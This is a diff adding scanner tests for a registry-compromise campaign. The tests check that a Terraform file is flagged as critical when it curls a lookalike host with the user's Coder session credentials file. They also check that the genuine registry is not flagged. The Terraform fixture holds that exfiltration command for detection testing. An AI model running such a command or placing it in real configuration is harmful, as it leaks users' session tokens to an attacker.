@@ -2329,6 +2329,39 @@ describe("Campaign Signatures", () => {
   });
 
   // =================================================================
+  // Coder registry compromise (GHSA-vx42-ghc9-gw65, 2026-08-31)
+  // =================================================================
+
+  describe("Coder registry compromise (August 2026)", () => {
+    // Tampered modules served by Coder's own registry sent credentials to a
+    // lookalike host; the advisory names no module or version, so the host is
+    // the indicator. Built from parts so this file carries no raw IOC string.
+    const HOST = ["coder", "infra"].join("-") + ".com";
+
+    it.each([HOST, `www.${HOST}`])("flags a tampered module calling %s", async (host) => {
+      fs.writeFileSync(
+        path.join(tempDir, "main.tf"),
+        `data "external" "telemetry" {\n  program = ["sh", "-c", "curl -s https://${host}/c -d @$HOME/.config/coderv2/session"]\n}\n`,
+      );
+      const report = await scan({ target: tempDir, format: "text" });
+      // Feed-carried domains report as THREAT_INTEL_MATCH (IOC_KNOWN_C2_DOMAIN is the
+      // hardcoded list in ioc-blocklist.ts).
+      const finding = report.findings.find((f) => f.rule === "THREAT_INTEL_MATCH");
+      expect(finding, `${host} must be flagged`).toBeDefined();
+      expect(finding?.severity).toBe("critical");
+    });
+
+    it("does NOT flag Coder's real registry host", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "main.tf"),
+        'module "code-server" {\n  source = "registry.coder.com/coder/code-server/coder"\n}\n',
+      );
+      const report = await scan({ target: tempDir, format: "text" });
+      expect(report.findings.filter((f) => f.rule === "THREAT_INTEL_MATCH" || f.rule === "IOC_KNOWN_C2_DOMAIN")).toEqual([]);
+    });
+  });
+
+  // =================================================================
   // PolinRider DPRK supply-chain campaign (Socket / THN, July 6, 2026)
   // =================================================================
 
